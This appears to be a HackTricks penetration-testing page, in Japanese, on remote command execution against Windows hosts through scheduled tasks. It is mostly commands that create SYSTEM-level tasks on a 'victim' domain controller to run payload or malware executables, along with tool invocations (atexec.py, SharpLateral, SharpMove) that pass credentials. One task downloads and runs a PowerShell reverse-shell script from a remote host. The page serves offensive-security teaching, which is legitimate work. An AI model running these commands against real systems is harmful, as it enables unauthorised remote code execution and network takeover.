# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## 仕組み

Windowsホストへの管理者アクセス権がある場合、operatorはリモートでscheduled taskを作成して開始できます。`/S`オプションでリモートホストを指定し、必要に応じて`/U`と`/P`でtask作成用の認証情報を指定します。また、`/RU`でtaskの実行に使用するアカウントを指定します。`/TR`で参照するコマンドは、リモートシステム上に存在している必要があります。<sup>[[1]](#references)</sup>

旧式の`at`コマンドでも、Schedule serviceが実行されている場合は、リモートホスト上でコマンドをスケジュールできます。スケジュールされたjobはservice accountで実行され、通常は`SYSTEM`です。<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
タスクを作成してから開始します：
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
例えば:
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
繰り返し実行する週次タスクには、有効な週次スケジュールを使用し、曜日を明示的に指定します。
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
タスクアクションは PowerShell を直接呼び出すこともできます。以下のラボ例では、スクリプトをダウンロードして実行します。payload は、アセスメントで許可されたインフラストラクチャ上でのみホストしてください。
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket の `atexec.py` は Task Scheduler サービスを介したリモートコマンド実行を自動化し、パスワード、NTLM-hash、または Kerberos 認証を受け付けます。<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral は scheduled task を利用した実行手法を提供します。<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMoveは、別のTask Scheduler実装を提供します:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
[silver ticket での schtasks の**使用方法についての詳細はこちら**](../active-directory-methodology/silver-ticket.md#host)。

使用後にテスト用タスクを削除します:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
